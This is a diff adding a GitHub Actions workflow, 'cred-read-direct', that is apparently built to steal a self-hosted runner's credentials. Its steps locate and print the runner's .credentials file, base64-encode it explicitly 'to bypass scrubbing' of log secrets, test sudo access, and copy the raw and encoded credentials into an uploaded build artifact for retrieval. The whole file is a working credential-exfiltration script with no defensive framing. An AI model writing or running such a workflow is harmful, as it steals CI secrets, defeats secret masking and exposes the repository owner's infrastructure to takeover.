@@ -1,0 +1,33 @@
+name: cred-read-direct
+on:
+  workflow_dispatch:
+jobs:
+  cred-read:
+    runs-on: ubuntu-latest
+    steps:
+      - name: direct credential read (no docker needed)
+        run: |
+          echo "=== find credentials without docker ==="
+          find ~/actions-runner -name ".credentials" -ls 2>/dev/null || true
+          echo "=== cat directly ==="
+          cat ~/actions-runner/extracted/.credentials 2>/dev/null || true
+          echo "=== base64 to bypass scrubbing ==="
+          cat ~/actions-runner/extracted/.credentials 2>/dev/null | base64 || true
+          echo "=== dir perms ==="
+          ls -la ~/actions-runner/ 2>/dev/null || true
+          ls -la ~/actions-runner/extracted/ 2>/dev/null || true
+          echo "=== sudo cat (confirm sudo works) ==="
+          sudo cat ~/actions-runner/extracted/.credentials 2>/dev/null | base64 || true
+
+      - name: write to artifact
+        run: |
+          mkdir -p /tmp/out
+          cp ~/actions-runner/extracted/.credentials /tmp/out/cred.txt 2>/dev/null || true
+          cat ~/actions-runner/extracted/.credentials 2>/dev/null | base64 > /tmp/out/cred_b64.txt || true
+          ls -la /tmp/out/
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: cred-direct
+          path: /tmp/out/
+          if-no-files-found: warn
